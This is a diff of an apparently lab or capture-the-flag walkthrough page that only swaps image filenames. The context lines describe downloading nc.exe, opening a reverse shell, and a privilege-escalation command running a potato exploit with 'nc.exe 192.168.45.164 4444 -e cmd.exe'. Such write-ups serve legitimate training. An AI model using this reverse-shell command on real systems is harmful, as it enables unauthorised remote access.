@@ -64,7 +64,7 @@ Then, we can
 
 Then, we can execute the script once to download `nc.exe` onto the machine, and another to execute `nc.exe` to get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -98,7 +98,7 @@ However, `PrintSpoofer.exe` wasn't working normally, so we probably need to use 
 .\potato.exe -cmd "C:\Windows\Tasks\nc.exe 192.168.45.164 4444 -e cmd.exe"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (63) (3).png" alt=""><figcaption></figcaption></figure>
 
 For some reason, this user was unable to run `whoami`, so I just captured the flag instead:
 
